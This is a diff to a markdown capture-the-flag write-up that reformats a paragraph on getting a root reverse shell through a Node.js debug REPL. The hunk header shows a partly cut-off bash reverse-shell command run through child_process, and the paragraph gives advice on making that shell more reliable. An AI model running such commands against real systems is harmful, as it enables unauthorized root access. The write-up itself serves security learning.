@@ -314,8 +314,9 @@ exec("process.mainModule.require('child_process').exec('bash -c \"bash -i >& /de
 
 ![Second Successful Reverse Shell](Screenshots/Second_Successful_reverse_shell.png)
 
-Why .execSync() instead of .exec() with .toString()?
-Both approaches work — as proven here, .exec() with .toString() successfully caught the root shell. However, .execSync() is the recommended practice for the inner child_process call. Since .execSync() is synchronous, it holds the process open intentionally rather than relying on async timing, making the shell connection more predictable and reliable across different Node.js versions and system configurations. In a real engagement, depending on asynchronous behavior to catch a reverse shell introduces a race condition that is better avoided. The outer exec() wrapper in the debug REPL remains necessary regardless — it is what sends the expression into the remote root process's evaluation context rather than executing locally on the client side. The [object Object] return printed in the debug REPL confirms the child process was successfully launched inside the root process.
+### Why `.execSync()` instead of `.exec()` with `.toString()`?
+
+> Both approaches work — as proven here, `.exec()` with `.toString()` successfully caught the root shell. However, `.execSync()` is the recommended practice for the inner `child_process` call. Since `.execSync()` is synchronous, it holds the process open intentionally rather than relying on async timing, making the shell connection more predictable and reliable across different Node.js versions and system configurations. In a real engagement, depending on asynchronous behavior to catch a reverse shell introduces a race condition that is better avoided. The outer `exec()` wrapper in the debug REPL remains necessary regardless — it is what sends the expression into the remote root process's evaluation context rather than executing locally on the client side. The `[object Object]` return printed in the debug REPL confirms the child process was successfully launched inside the root process.
 ---
 
 ## Root Flag
